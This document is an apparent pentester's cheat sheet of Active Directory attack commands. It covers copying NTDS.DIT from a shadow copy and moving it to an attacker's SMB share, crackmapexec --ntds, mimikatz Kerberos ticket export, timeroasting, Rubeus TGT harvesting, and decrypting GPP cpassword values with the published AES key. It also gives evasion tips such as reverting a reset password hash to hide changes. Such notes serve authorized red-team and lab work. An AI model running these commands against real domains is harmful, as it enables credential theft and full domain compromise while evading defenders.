# AD Tips

% active diretory

## Manual dumping NTDS.DIT as a user in Admin group/DA group
```
# Check local group membership > Admin group ?
net localgroup

# Check user priv including Domain
net user <USERNAME>

# Shadow copy of C:i, note the Shado copy volume name
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.DIT form the VSS
# example: cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c copy \\?\GLOBALROOT\Device\<..> c:\NTDS\NTDS.dit

# Create a SMB share on the attacker's machine

#  Transferring NTDS.dit to Attack Host
cmd.exe /c move C:\NTDS\NTDS.dit \\<ATK IP>\<SHARENAME>
```

## Dumping NTDS.DIT - netexec (uses VSS)
```
crackmapexec smb <IP> -u <USER> -p <PASSWD> --ntds
```

## Harvest kerberos tickets from windows
```
# Harvest kerberos tickets from windows

# From mimikatz
mimikatz # privilege::debug
sekurlsa::tickets /export

dir *.kirbi
```

## Bloodhound - Finding non-default AD groups from injestor JSON output
```
#Bloodhound - Finding non-default AD groups from injestor JSON output 
# Non-default AD groups have the last part of their domains SID > 1000
 cat 20250731161542_groups.json | jq '.data[]
        | select((.ObjectIdentifier | split("-") | last | tonumber) > 1000)
        | [.ObjectIdentifier, .Properties.name, .Properties.whencreated]'
# DNS Admin which SID > 1000 is a default group, ignore it
```

# Faketime - Adhoc Kerberos auth
```
# Using faketime + ntpdate to avoid KRB_AP_ERR_SKEW(Clock skew too great)

# Internal or via ligolo
faketime "$(ntpdate -q dc01.ad.lab | cut -d ' ' -f 1,2)" \
bloodhound-python -c All -u joan.hesther -p 'madison' -d ad.lab -ns 10.80.80.2

# Through proxy or ssh
proxychains -q faketime "$(ntpdate -q dc01.ad.lab | cut -d ' ' -f 1,2)" \ 
bloodhound-python -c All -u joan.hesther -p 'madison' -d ad.lab -ns 10.80.80.2 --dns-tcp

# source : https://notes.benheater.com/books/active-directory/page/using-faketime-for-ad-hoc-kerberos-authentication
```

# impacket - secretsdumps
```
Useful options :
-pwd-last-set -user-status -history

Faster cracking if recent passwords are a variation of older ones that got cracked.

Opsec :
If you used ForcedPassword on a user to set a users's password
You can revert the user's hash to its previous value to make it appear unchanged
```

# Reminder : Domain name resolution
```
1. Domain/DC name resolution
Once you've found a domain name + a DC for it, add to the /etc/hosts the matching resolution :
X.X.X.X domain.tld dc.domain.tld dc01.domain.tld

When authenticating using kerberos, replace :
- DC IP <> DC name matching in the IP in /etc/hosts

It is especially when using kerberos authentication and avoid LDAP authentication errors
2. Name server
Specify the DC's ip for a given domain using -ns/-nameserver parameters in most tools.
```

## Using NT:LM hash
```
# Prepend NT hashes with ':' !(Or use NT:LM hash in its entirety) Beware of authentication failures because of this
```

## Bloodhound - Run systematically an Injestor after each compromission
```
# If the OPSEc allows it, run systematically the injestor after each user compromission.
```

## Timeroast NTP auth abuse - Gather MD5 digest, crack to recover user's NT Hash
```
# Timeroast
# Unauthenticated clients can take a list of RIDs and send MS-SNTP requests to a DC to collect MD5 digests calculated with domain computer hashes. This makes timeroasting a viable method to identify and crack pre-created machine accounts and other weak computer passwords in a stealthier manner than by using dictionaries or tools like pre2k
#  - it can only be used to obtain computer hashes
#  - it requires a way to map RIDs to usernames, so either NULL sessions or valid domain credentials

# More advanced attack as DA :
# Abuse this technique to find clear text password (after cracking) of a few specific users but does not want to risk getting caught, thus deciding to avoid credential extraction methods that are likely to sound alarms
# Ioc :
# - multiple MS-SNTP client requests sent by the same host with a different RID
# - the RID in these requests belongs to a user and not a computer
# - ...
# Rq: important to note that user accounts cannot be used for interactive logons while UF_WORKSTATION_TRUST_ACCOUNT is set.
# More here : https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac
python timeroast.py <IP>
````

## Rubeus - TGT ticket harvesting when Admin on a DC that is a KDC
```
If you are Admin on a DC which plays the role of the KDC, you can
- dump the TGT already on memory using Rubeus & impersonate users
- monitor & harvest TGT on that DC
```

## Noteworthy default settings for a DC
```
- SMB
  - SMB signing is enabled by default on Windows Server acting as DC
```

## SMB share - SYSVOL hunting passwd
```
# SMB share - SYSVOL hunting passwd


    To reach SYSVOL folder: run> %Logonserver%

    \\SYSVOL<DOMAIN>\Policies\

    Search for XML, VBS or Batch file that is used to change the password. This can be done by searching for the mentioned file types (with specific search keywords). The password reset script is to be found.

    *.xml , *.vbs , *.bat etc.

    Map drives (Drives.xml)

    Create Local Users (unattend.xml)

    Data Sources (DataSources.xml)

    Printer configuration (Printers.xml)

    Create/Update Services (Services.xml)

    Scheduled Tasks (ScheduledTasks.xml)

    Change local Administrator passwords

    Group policy preferences (Groups.xml)

These XML files can be searched in the SYSVOL folder using key word search. Passwords in the XML file can be searched using the key value “cpassword”. The encryption is 32-byte AES as per Microsoft’s documentation, the encryption key is:

4e 99 06 e8 fc b6 6c c9 fa f4 93 10 62 0f fe e8

f4 96 e8 06 cc 05 79 90 20 9b 09 a4 33 b6 6c 1b

AES KEY Source: https://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be.aspx

With access to this XML file, the attacker can use the AES private key to decrypt the GPP password. The PowerSploit function Get-GPPPassword is most useful for Group Policy Preference exploitation.

https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1
```
